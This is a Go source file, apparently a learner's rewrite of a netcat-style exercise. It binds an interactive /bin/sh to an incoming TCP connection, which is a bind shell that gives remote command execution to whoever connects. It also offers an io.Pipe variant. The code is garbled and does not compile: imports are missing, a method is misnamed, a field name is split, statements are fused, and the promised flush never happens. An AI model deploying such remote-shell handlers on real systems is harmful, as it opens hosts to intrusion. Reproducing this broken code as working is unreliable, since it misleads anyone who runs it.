package main
//netcats security hole from the pov of tcp listerner awaiting a connection
//custom writer that wraps a buffered wrter and forces buffer to be flushed 
import (
	"bufio"
	"io"
	"net"
	
)

// Flusher wraps bufio.Writer, explicity flushing on all writes
type Flusher struct {
	wipeflushed *bufio.Writer //used to be w
}

// NewFlusher creates a new Flusher from an io.Writer
func NewFlusher(wipeflushed io.Writer) *Flusher {
	return &Flusher{
		wipeflushed: bufio.NewWriter(wipeflushed),
	}
}

// Write writes data to underlying buffered writer and explcity flushes output
func (foo *Flusher) Writer(bytewrite []byte) (int, error) {
	count, err := foo.wipeflushed.Write(bytewrite)
	if err != nil {
		return -1, err
	}
	return count, err
}
// tweak connectionhandler to instntiate and use Flusher for conn.stdout
func handle(conn net.Conn) {
	// explicitly calling /bin/sh and use -i for interactive mode
	//so we can use it for stdin and stdout
	// for windows, use exec.COmmand("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")

	//set stdin to our connection
	cmd.Stdin = conn
	//Create a flusher from the connection to use for stdout
	//ensures stdout is flushed adequate and sent via net.conn
	cmd. Std out = NewFlusher(conn)

	//run command
	if err := cmd.Run(); err != nil {
		log.Fatalln(err
		)
	}
}
//for a more elegent solution, wrwrite using the io.Pipe() function, to connect readers and writers
// means this flushing is not needed
// rewrite the handler function
func handle2(conn net.Conn) {
	//explicity call /bin/she and -i
	//to use for stdin and stdout
	cmd := exec.Command("/bin/sh", "-i")
	//set upt stdin to connection
	rp, wp := io.Pipe()
	cmd.Stdin = conncmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}